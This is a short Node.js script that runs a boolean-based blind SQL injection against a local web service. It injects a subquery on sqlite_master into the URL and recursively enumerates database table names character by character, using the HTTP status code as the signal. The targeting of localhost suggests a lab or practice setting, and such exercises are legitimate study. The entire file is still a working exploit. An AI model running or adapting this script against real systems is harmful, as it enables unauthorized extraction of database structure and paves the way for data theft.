const request = require('request');

function get(url) {
  return new Promise((resolve, reject) => {
    request(url, (error, response, body) => {
      if (!error) {
        resolve({response, body});
      } else {
        reject(error);
      }
    });
  });
}

function getTableName(name) {
  const url = `http://localhost:3000/1%20and%20(select%20count(*)%20from%20sqlite_master%20where%20substr(tbl_name,%201,%20${name.length})%20=%20'${name}')%20%3E%200`;
  return get(url);
}

const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'.split('');

function search(optBase) {
  const base = optBase || '';

  chars
    .map(c => base + c)
    .forEach(name => {
      getTableName(name)
        .then(result => {
          if (result.response.statusCode === 200) {
            console.log(name + '*');
            search(name);
          }
        });
    });
}

search();
